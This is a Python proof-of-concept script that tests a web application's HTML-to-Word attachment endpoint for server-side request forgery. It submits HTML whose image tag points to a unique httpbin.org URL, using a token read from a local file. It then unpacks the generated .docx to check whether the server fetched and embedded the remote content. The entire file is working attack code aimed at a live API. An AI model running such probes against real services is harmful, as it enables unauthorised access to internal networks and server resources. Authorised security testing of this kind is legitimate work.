import json,subprocess,os,uuid,zipfile,io,base64
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()
tag='ZXVERIFY'+uuid.uuid4().hex[:8]
# httpbin /base64/<b64> returns the decoded string verbatim — deterministic, unique
b64=base64.b64encode(tag.encode()).decode()
URL=f'https://httpbin.org/base64/{b64}'
print(f"target URL: {URL}")
print(f"expected body: {tag!r}")
print()
def render(html,name,atype='130'):
    body={"html":html,"type":"word","attachableType":"AuditableEntity",
          "attachableId":atype,"fileName":name}
    cmd=['curl','-s','-m','120','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+'/api/v1/attachments/html',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    try: return c,json.loads(open('/tmp/b',encoding='utf-8',errors='replace').read())
    except: return c,None
def get(p):
    cmd=['curl','-s','-m','30',H+p,'-H','token: '+TOK,'-H',BB]
    return json.loads(subprocess.run(cmd,capture_output=True,text=True).stdout)
print("=== render with <img src=target.ico> ===")
c,d=render(f'<h1>ZX</h1><img src="{URL}">', f'zx-{tag}')
print(f"  gen -> {c} {str(d)[:120]}")
if c=='200':
    aid=d['attachmentId']
    a=get(f'/api/v1/attachments/{aid}')['attachments'][0]
    f=get(f"/api/v1/files/{a['file_id']}")['files'][0]
    print(f"  file={a['file_id']} size={f.get('size')}")
    subprocess.run(['curl','-s','-m','60','-o','/tmp/v.docx',f['url']])
    raw=open('/tmp/v.docx','rb').read()
    z=zipfile.ZipFile(io.BytesIO(raw))
    media=[n for n in z.namelist() if 'media' in n]
    print(f"  media entries: {media}")
    for m in media:
        blob=z.read(m)
        print(f"    {m}: {len(blob)} bytes")
        print(f"    content: {blob[:200]!r}")
        print(f"    *** CONTAINS MY UNIQUE TAG: {tag.encode() in blob} ***")
open('/tmp/vtag','w').write(tag)
